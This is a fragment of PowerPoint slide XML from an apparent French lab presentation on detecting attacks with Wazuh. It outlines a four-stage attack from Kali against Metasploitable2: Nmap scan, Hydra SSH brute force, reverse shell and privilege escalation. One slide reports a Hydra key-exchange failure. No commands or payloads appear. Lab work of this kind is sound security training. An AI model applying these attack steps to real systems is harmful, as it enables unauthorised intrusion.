          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8050897" y="1280160"/>
            <a:ext cx="2826286" cy="5120640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="231" name="Google Shape;231;p13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7968601" y="6519672"/>
            <a:ext cx="2990878"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Détail d'alerte confirmant la source Metasploitable2</a:t>
            </a:r>
            <a:endParaRPr sz="1050" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="232" name="Google Shape;232;p13"/>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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>14</a:t>
            </a:r>
            <a:endParaRPr sz="1000" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Image 0" descr="navbar_wazuh.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4C275BFD-A603-583B-B92D-3D79125587AD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="579120" y="96012"/>
            <a:ext cx="6096000" cy="580644"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2689548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fade">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="2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
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="10" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="227"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="11" presetID="10" presetClass="entr" presetSubtype="0" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="230"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="2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1"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="16"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p:bldP spid="228" grpId="0"/>
      <p:bldP spid="23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1"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="262" name="Google Shape;262;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="384048"/>
            <a:ext cx="10058400" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="45700" rIns="91425" bIns="45700" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buClr>
                <a:srgbClr val="E11D48"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E86C0"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E86C0"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> · VALIDATION DU SCÉNARIO COMPLET</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="263" name="Google Shape;263;p15"/>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i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>4 volets </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>d'attaque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>depuis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t> Kali — bout </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t> bout</a:t>
            </a:r>
            <a:endParaRPr sz="2700" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="264" name="Google Shape;264;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="2468880" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10526"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="15875" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="E11D4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15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="807720" y="1388385"/>
            <a:ext cx="2468880" cy="86868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F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Scan</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F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>(Nmap)</a:t>
            </a:r>
            <a:endParaRPr sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="266" name="Google Shape;266;p15"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3017520" y="1851660"/>
            <a:ext cx="320040" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="5B6B7F"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd type="none" w="sm" len="sm"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="267" name="Google Shape;267;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3337560" y="1417320"/>
            <a:ext cx="2468880" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10526"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="15875" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="E11D4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15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3794760" y="1431035"/>
            <a:ext cx="2468880" cy="86868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F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Brute force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F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>SSH</a:t>
            </a:r>
            <a:endParaRPr sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="269" name="Google Shape;269;p15"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5806440" y="1851660"/>
            <a:ext cx="320040" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="5B6B7F"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd type="none" w="sm" len="sm"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="270" name="Google Shape;270;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6126480" y="1417320"/>
            <a:ext cx="2468880" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10526"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="15875" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="E11D4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15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="1440152"/>
            <a:ext cx="2468880" cy="86868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F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Reverse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F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>shell</a:t>
            </a:r>
            <a:endParaRPr sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="272" name="Google Shape;272;p15"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8595360" y="1851660"/>
            <a:ext cx="320040" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="5B6B7F"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd type="none" w="sm" len="sm"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="273" name="Google Shape;273;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8915400" y="1417320"/>
            <a:ext cx="2468880" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10526"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="15875" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="E11D4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15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9616440" y="1388385"/>
            <a:ext cx="2468880" cy="86868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F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Escalade de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F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>privilèges</a:t>
            </a:r>
            <a:endParaRPr sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="275" name="Google Shape;275;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2606040"/>
            <a:ext cx="1005840" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E11D4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15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2606040"/>
            <a:ext cx="100584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DÉFI</a:t>
            </a:r>
            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="277" name="Google Shape;277;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2606040"/>
            <a:ext cx="48463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B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1150"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Hydra </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>échoue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> de nouveau (kex error) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>contre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>vrai</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>scénario</a:t>
            </a:r>
            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="278" name="Google Shape;278;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1045450" y="2935224"/>
            <a:ext cx="4401339" cy="3227832"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1983"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="22225" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="E11D48"/>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9" name="Google Shape;279;p15" descr="/sessions/intelligent-upbeat-noether/mnt/outputs/pptx_images/fig39_hydra_kex_fail.jpg"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1127746" y="3017520"/>
            <a:ext cx="4236747" cy="3063240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="280" name="Google Shape;280;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1045450" y="6199632"/>
            <a:ext cx="4401339"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Hydra : incompatibilité persistante des algorithmes SSH</a:t>
            </a:r>
            <a:endParaRPr sz="1050" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="281" name="Google Shape;281;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="2606040"/>
            <a:ext cx="1280160" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E9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15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="2606040"/>
            <a:ext cx="128016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SOLUTION</a:t>
            </a:r>
            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
